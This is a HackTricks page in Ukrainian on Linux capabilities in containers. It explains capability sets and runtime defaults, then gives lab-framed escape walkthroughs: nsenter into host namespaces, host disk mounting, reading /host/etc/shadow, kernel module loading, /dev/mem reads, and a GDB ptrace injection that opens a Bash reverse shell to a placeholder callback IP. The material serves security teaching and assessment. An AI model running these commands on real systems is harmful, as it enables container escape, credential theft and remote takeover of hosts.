# Linux capabilities у контейнерах

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux capabilities — одна з найважливіших складових безпеки контейнерів, адже вони дають відповідь на тонке, але фундаментальне запитання: **що насправді означає «root» усередині контейнера?** У звичайній системі Linux UID 0 історично означав дуже широкий набір привілеїв. У сучасних ядрах ці привілеї розділено на менші одиниці, які називаються capabilities. Процес може працювати від імені root і водночас не мати багатьох потужних можливостей, якщо відповідні capabilities вилучено. <sup>[[1]](#references)</sup>

Контейнери значною мірою спираються на цю відмінність. Багато робочих навантажень досі запускаються з UID 0 усередині контейнера з міркувань сумісності або простоти. Без скидання capabilities це було б надто небезпечно. Якщо capabilities скинуто, процес root у контейнері все ще може виконувати багато звичайних завдань усередині контейнера, але йому заборонено чутливіші операції з ядром. Тому оболонка контейнера, яка показує `uid=0(root)`, не означає автоматично «root на хості» чи навіть «широкі привілеї ядра». Набори capabilities визначають, наскільки насправді цінна ця ідентичність root.

Повний довідник Linux capabilities і багато прикладів їх зловживання дивіться тут:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Принцип роботи

Capabilities відстежуються в кількох наборах, зокрема permitted, effective, inheritable, ambient і bounding. Для багатьох оцінювань контейнерів точна семантика кожного набору на рівні ядра менш важлива за практичне запитання: **які привілейовані операції цей процес може успішно виконувати зараз і які можливості отримати додаткові привілеї ще залишаються?** <sup>[[1]](#references)</sup>

Це важливо, оскільки багато технік виходу з контейнера насправді є проблемами з capabilities, замаскованими під проблеми контейнерів. Робоче навантаження з `CAP_SYS_ADMIN` може отримати доступ до величезної кількості функціональності ядра, якої звичайний процес root у контейнері не повинен торкатися. Робоче навантаження з `CAP_NET_ADMIN` стає набагато небезпечнішим, якщо воно також використовує спільний із хостом network namespace. Робоче навантаження з `CAP_SYS_PTRACE` стає набагато цікавішим, якщо через спільний із хостом PID namespace воно бачить процеси хоста. У Docker або Podman це може задаватися як `--pid=host`; у Kubernetes зазвичай використовується `hostPID: true`.

Інакше кажучи, набір capabilities не можна оцінювати окремо. Його потрібно розглядати разом із namespaces, seccomp і політикою MAC.

## Лабораторна робота

Найпростіший спосіб перевірити capabilities усередині контейнера:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Також можна порівняти контейнер із суворішими обмеженнями з контейнером, якому додано всі capabilities:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Щоб побачити ефект точкового додавання, спробуйте скинути всі capabilities і повернути лише одну:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Ці невеликі експерименти допомагають побачити, що runtime не просто перемикає булеву змінну з назвою «privileged». Він формує фактичну поверхню привілеїв, доступну процесу.

## Капабіліті високого ризику

Капабіліті стають примітивами втечі лише тоді, коли їхня дія поширюється на **ресурс, контрольований хостом**. Типові комбінації високого ризику:

- **`CAP_SYS_ADMIN`** разом із PID хоста, блоковим пристроєм або доступним для запису шляхом керування ядром. Для приєднання до цільового mount namespace також потрібен `CAP_SYS_CHROOT`; для монтування файлової системи на основі блокового пристрою потрібен `CAP_SYS_ADMIN` в початковому user namespace.
- **`CAP_SYS_PTRACE`** разом із видимістю PID хоста та доступним для приєднання процесом хоста. Для ptrace-ін’єкції `CAP_SYS_ADMIN` не потрібен.
- **`CAP_DAC_OVERRIDE` або `CAP_DAC_READ_SEARCH`** разом із доступною файловою системою хоста. Ці капабіліті обходять різні перевірки DAC, але не створюють доступ до файлової системи хоста.
- **`CAP_SYS_MODULE`** в початковому user namespace разом із прийнятним для ядра сумісним модулем. Звичайні Linux-контейнери використовують спільне ядро вузла; середовища виконання на базі VM або userspace-kernel змінюють цю межу.
- **`CAP_MKNOD`** в початковому user namespace разом із реальним пристроєм хоста, доступ до якого вже дозволяє device cgroup. Створення вузла не обходить device cgroup.
- **`CAP_SYS_RAWIO`** разом із доступним і придатним до використання інтерфейсом пам’яті, портів вводу-виводу, PCI або керування пристроєм.
- **`CAP_SYS_BOOT`** разом із початковим PID namespace для перезавантаження хоста або придатним до використання й дозволеним шляхом kexec для заміни ядра.
- **`CAP_NET_ADMIN`** у мережевому namespace хоста для безпосереднього керування мережевим станом вузла. **`CAP_NET_RAW`** може бути задіяна в escape, специфічному для певного протоколу, але самі лише raw-сокети не дають доступу до оболонки вузла.

`CAP_SYS_CHROOT` навмисно не наведено як окрему капабіліті для втечі. Вона може бути потрібна для `setns()` у mount namespace і може спростити роботу з уже доступним деревом хоста, але сам по собі `chroot()` не відкриває це дерево й не надає нових прав доступу до файлової системи. Так само `CAP_BPF` і `CAP_PERFMON` відкривають доступ до потужної телеметрії та поверхні атаки ядра, але без окремої вразливості ядра їхні звичайні операції не є універсальними шляхами втечі з контейнера.

## Використання в runtime

Docker, Podman, стеки на базі containerd і CRI-O використовують керування капабіліті, але їхні налаштування за замовчуванням та інтерфейси керування відрізняються. Docker надає прямий доступ до них через такі прапорці, як `--cap-drop` і `--cap-add`. Podman пропонує подібні засоби керування й часто поєднує їх із запуском без root як додатковим рівнем безпеки. У Kubernetes додавання та вилучення капабіліті задається через `securityContext` Pod або контейнера; runtime нижчого рівня передають сформовані набори в конфігурації OCI runtime. Середовища системних контейнерів, як-от LXC та Incus, також покладаються на керування капабіліті, але їхня тісніша інтеграція з хостом може спонукати операторів послаблювати налаштування за замовчуванням більше, ніж для контейнера застосунку. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Той самий принцип діє для всіх них: капабіліті, яку технічно можна надати, не обов’язково слід надавати. Багато реальних інцидентів починаються з того, що оператор додає капабіліті лише тому, що робоче навантаження не працювало з суворішою конфігурацією, а команді було потрібне швидке рішення.

## Помилкові конфігурації

Найочевидніша помилка — **`--cap-add=ALL`** у CLI на кшталт Docker/Podman, але це не єдина проблема. На практиці частіше надають одну чи дві надзвичайно потужні капабіліті, особливо `CAP_SYS_ADMIN`, щоб «змусити застосунок працювати», не розібравшись у наслідках для namespace, seccomp і mount. Ще одна поширена помилка — поєднання додаткових капабіліті зі спільним використанням namespace хоста. У Docker або Podman це може виглядати як `--pid=host`, `--network=host` або `--userns=host`; у Kubernetes аналогічний доступ зазвичай надають через такі параметри робочого навантаження, як `hostPID: true` або `hostNetwork: true`. Кожна така комбінація змінює те, на що фактично може впливати капабіліті.

Також адміністратори часто вважають, що якщо робоче навантаження не запущене з `--privileged`, то воно все ще має суттєві обмеження. Іноді це так, але іноді фактичний рівень доступу вже настільки близький до привілейованого, що ця відмінність перестає мати практичне значення.

## Зловживання

Почніть із фіксації ефективних наборів, відображення user namespace, стану seccomp, namespace, монтувань і пристроїв. Назва капабіліті без цього контексту не доводить наявність шляху втечі:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: простори імен і блокові пристрої

За видимості PID хоста `CAP_SYS_ADMIN` дає змогу входити в простори імен хоста. Для операції з простором імен монтування також потрібен `CAP_SYS_CHROOT` у просторі імен користувача викликувача.

**Перевірте capability та обмеження:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Перелічіть ціль:** підтвердьте спільне використання PID хоста за конфігурацією контейнера/Pod або за беззаперечним списком процесів хоста, а потім перевірте простори імен цілі. Локальний PID 1 існує і в приватних просторах імен PID, тому сама його наявність не доводить спільне використання PID хоста.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Експлуатуйте шлях namespace:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Перевірки capabilities мають успішно проходити в user namespaces, яким належать цілі. `--pid=host` або Kubernetes `hostPID: true` надає видимість, але не надає capabilities.

Для альтернативного шляху через block device спочатку **перелічіть** кандидатів, а потім **exploit** доступну файлову систему, спершу змонтувавши перевіреного кандидата лише для читання:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Вузол пристрою має існувати, device cgroup має дозволяти його використання, а для монтування блокових файлових систем потрібен `CAP_SYS_ADMIN` в початковому user namespace. Якщо root хоста вже змонтовано через bind у `/host`, це дає доступ до хоста **без** `CAP_SYS_ADMIN`; `chroot /host` — лише зручний спосіб, для якого окремо потрібен `CAP_SYS_CHROOT`.

### Доступний root хоста: пряме виконання з файлової системи

Якщо root хоста вже змонтовано в `/host`, спершу перевірте монтування, а потім використовуйте наявний доступ напряму. Цей спосіб не залежить від `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Якщо `chroot()` недоступний, але бінарний файл хоста сумісний з архітектурою та завантажувачем контейнера, його часто можна викликати через змонтоване дерево:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Пряме читання та запис у `/host` уже означають компрометацію файлової системи хоста. `chroot()` або виконання бінарного файла хоста лише спрощують такий доступ; жодна з цих операцій не створює монтування хоста й не обходить монтування лише для читання або політику MAC.

### `CAP_SYS_PTRACE`: ін'єкція в процес хоста

Якщо процеси хоста видимі за PID і в user namespace цільового процесу є `CAP_SYS_PTRACE`, GDB може змусити дозволений процес хоста викликати `system()`. `CAP_SYS_ADMIN` не потрібен.

**Перевірте capability та обмеження на приєднання:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Перелічіть і виберіть ціль, яку можна безпечно завершити:** підтвердьте спільний простір PID хоста за конфігурацією або за однозначним списком процесів вузла; ніколи не вибирайте PID 1 чи критичний демон.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Експлуатувати вибраний процес:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Ціль має допускати приєднання до неї, а також мати доступний символ `system()` і шлях до payload Bash. Yama, стан non-dumpable, seccomp, user namespaces і MAC policy можуть заблокувати цей ланцюжок. GDB зупиняє ціль під час приєднання, тому використовуйте лише disposable-процес у лабораторному середовищі.

### `CAP_DAC_OVERRIDE` і `CAP_DAC_READ_SEARCH`: захищені файли хоста

Ці capabilities не відкривають файлову систему хоста. Якщо `/host` уже є монтуванням хоста, `CAP_DAC_READ_SEARCH` може обходити перевірки DAC для читання та пошуку, а `CAP_DAC_OVERRIDE` додатково може обходити звичайні перевірки запису:

**Перевірте capabilities:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Перелічіть доступну файлову систему хоста та дозволи цільового об’єкта:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Відпрацюйте обходи читання й запису** в одноразовому лабораторному середовищі:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Монтування лише для читання та правила LSM усе ще діють. `CAP_DAC_READ_SEARCH` також дозволяє викликати `open_by_handle_at()`, але для breakout на кшталт Shocker додатково потрібні файловий дескриптор монтування тієї самої базової файлової системи, дійсні або доступні для виявлення handles, сумісна файлова система/сховище та відсутність блокування з боку runtime або LSM. Це не надає довільного доступу до кожної файлової системи поза простором імен монтувань.

### `CAP_SYS_MODULE`: виконання у спільному ядрі

У звичайному контейнері Linux прийнятий модуль виконується у спільному ядрі хоста.

**Перевірте capability і область дії user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Перелічіть передумови завантаження модулів:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit лише із сумісним, попередньо перевіреним proof-модулем на одноразовому вузлі:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Можливість має бути ефективною в початковому просторі імен користувачів. Версія та конфігурація ядра, підписи модулів, lockdown, seccomp і політика LSM мають дозволяти завантаження. Kata, gVisor, ізоляція Hyper-V та подібні середовища виконання змінюють межу ядра, до якої має доступ робоче навантаження.

### `CAP_MKNOD`: створення дозволеного дескриптора пристрою

`CAP_MKNOD` створює вузол пристрою, але не обходить cgroup пристроїв. Створення пристроїв не ізольоване просторами імен, тому можливість має бути ефективною в початковому просторі імен користувачів.

**Перевірте можливість і область дії простору імен користувачів:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Перелічіть реальні пристрої, їхні номери major/minor і будь-який видимий список дозволів cgroup-v1:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Експлуатувати перевіреного кандидата з сімейства ext лише для читання:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Для інших файлових систем потрібен відповідний інструмент лише для читання; для монтування пристрою також потрібен `CAP_SYS_ADMIN`. Помилка `Operation not permitted` під час відкриття створеного вузла зазвичай означає, що cgroup пристроїв і досі блокує доступ до нього. У cgroup v2 доступ до пристроїв зазвичай контролюється за допомогою BPF, а файл `devices.list` відсутній, тому вирішальним тестом є успішне відкриття.

### `CAP_SYS_RAWIO`: відкритий інтерфейс прямого доступу до вводу-виводу

Універсального переносного payload немає: допустимі адреси та ефекти залежать від обладнання й конфігурації ядра.

**Перевірте capability та область дії user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Перелічіть доступні сирі інтерфейси, обладнання та драйвери:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Exploit лише з дозволеним proof для визначеного пристрою та діапазону адрес.** Якщо `/dev/mem` — це дозволений у лабораторії інтерфейс, цей шаблон підтверджує розкриття вмісту пам’яті вузла, не виводячи його вміст:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Адреса має надходити з апаратної карти лабораторного стенда, оскільки читання деяких областей MMIO може мати побічні ефекти. Універсальна команда запису в пам’ять була б оманливою та небезпечною: та сама адреса на одній машині може бути нешкідливою, а на іншій — керувати апаратним забезпеченням або пам’яттю ядра. Групи пристроїв cgroups, дозволи файлової системи, суворі обмеження `/dev/mem`, блокування ядра, віртуалізація та політики LSM зазвичай унеможливлюють корисний доступ.

### `CAP_SYS_BOOT`: перезавантаження простору імен або заміна ядра

У приватному просторі імен PID виклик `reboot()` завершує процес init цього простору імен, а не перезавантажує хост. Тому для перезавантаження хоста потрібен доступ до початкового простору імен PID, зазвичай через спільне використання PID хоста. Для шляху через kexec також потрібен сумісний образ ядра та дозвільна політика блокування/підпису:

**Перевірка capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Перелічіть передумови для простору імен PID і kexec:** за конфігурацією робочого навантаження підтвердьте спільний із хостом простір PID, оскільки саме посилання на простір імен PID не показує, чи є він початковим простором імен вузла.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Експлуатуйте лише тоді, коли перезавантаження одноразового лабораторного вузла прямо передбачено вправою:**

```bash
sync
reboot -f
```

Не виконуйте цю команду й не завантажуйте модуль ядра на спільному вузлі лише для того, щоб довести наявність capability. У приватному PID namespace вона завершує лише процес init цього простору імен і не демонструє впливу на хост.

### `CAP_NET_ADMIN` і `CAP_NET_RAW`: мережеві шляхи до хоста

`CAP_NET_ADMIN` впливає лише на поточний мережевий namespace.

**Перевірте capabilities і обмеження:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Перелічіть поточні мережі та підтвердьте використання мережі хоста за конфігурацією робочого навантаження:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Використовуйте `CAP_NET_ADMIN` з можливістю відкату:** у режимі мережі хоста тимчасовий інтерфейс є інтерфейсом вузла.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` дозволяє використовувати сокети RAW і PACKET, але не є універсальним засобом отримання shell на хості. Щоб **перелічити** задокументований ланцюжок GCE, перевірте маршрут до метаданих і зафіксуйте, чи можна спостерігати незашифрований трафік агента гостя:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Якщо відповідні передумови виконано, **експлуатуйте** специфічний для середовища ланцюжок, описаний у [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): перехопіть запит і стан послідовності, підставте підроблену відповідь метаданих із SSH-ключем, а потім перевірте доступ до хоста. Для цього ланцюжка потрібні root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, незашифрований трафік до метаданих GCE та запит guest-agent, вразливий до race condition; сучасний транспорт або поведінка агента можуть порушити його роботу.

### Обмеження для локального походження та адреси інтерфейсів

Слухач може відхиляти з’єднання з джерела `127.0.0.1`, але не враховувати іншу адресу, призначену тому самому мережевому простору імен. Якщо слухач доступний через цей інтерфейс, порівняйте з’єднання через loopback зі з’єднанням, прив’язаним до наявної локальної адреси, що не є loopback. `CAP_NET_ADMIN` може дозволити налаштувати інтерфейс у поточному просторі імен, але він не потрібен, якщо відповідну адресу вже призначено. `CAP_NET_RAW` не є передумовою для звичайного TCP-з’єднання. Це помилка класифікації адреси джерела, а не вихід із контейнера й не доказ того, що застосунок авторизує привілейований запит.<sup>[[1]](#references)[[7]](#references)</sup>

Для слухача WebSocket коректна відповідь HTTP `101 Switching Protocols` підтверджує завершення початкового handshake; подальша помилка на рівні застосунку може свідчити, що з’єднання дійшло до обробника. Жодна з цих відповідей не доводить, що автентифікація або запитана операція завершилися успішно.<sup>[[8]](#references)</sup>

## Перевірки

Мета перевірок capabilities — не лише вивести необроблені значення, а й з’ясувати, чи має процес достатньо привілеїв, щоб поточні параметри простору імен і монтування створювали небезпеку.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Що тут цікаво:

- `capsh --print` — найпростіший спосіб виявити capabilities із високим рівнем ризику, як-от `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` або `cap_sys_module`.
- Рядок `CapEff` у `/proc/self/status` показує, які capabilities ефективні зараз, а не лише які можуть бути доступні в інших наборах.
- Дамп capabilities стає значно важливішим, якщо контейнер також використовує спільні з хостом PID, network або user namespaces чи має доступ на запис до монтувань хоста.

Після збору сирих даних про capabilities наступний крок — інтерпретація. З’ясуйте, чи є процес root, чи активні user namespaces, чи використовуються спільні з хостом namespaces, чи застосовується seccomp, і чи обмежують процес AppArmor або SELinux. Сам набір capabilities — лише частина картини, але часто саме він пояснює, чому один container breakout спрацьовує, а інший — ні, хоча початкові умови здаються однаковими.

## Типові налаштування runtime

| Runtime / платформа | Типовий стан | Типова поведінка | Поширене ручне послаблення захисту |
| --- | --- | --- | --- |
| Docker Engine | За замовчуванням набір capabilities скорочено | Docker залишає типовий список дозволених capabilities і відкидає решту | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | За замовчуванням набір capabilities скорочено | Контейнери Podman за замовчуванням непривілейовані й використовують скорочену модель capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Успадковує типові налаштування runtime, якщо їх не змінено | Якщо `securityContext.capabilities` не вказано, контейнер отримує типовий набір capabilities від runtime | `securityContext.capabilities.add`, відсутність `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O під Kubernetes | Зазвичай типові налаштування runtime | Ефективний набір залежить від runtime і специфікації Pod | те саме, що й у рядку Kubernetes; пряма конфігурація OCI/CRI також може явно додавати capabilities |

Для Kubernetes важливо те, що API не визначає єдиного універсального типового набору capabilities. Якщо Pod не додає і не відкидає capabilities, workload успадковує типові налаштування runtime для цього вузла.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) — сторінка посібника Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative — конфігурація контейнерів Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Документація Docker — привілеї runtime і capabilities Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Документація Kubernetes — налаштування capabilities для контейнера](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Документація Podman — `--cap-add` і `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Документація Incus — безпека](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) — реалізація протоколу IPv4 у Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 — протокол WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
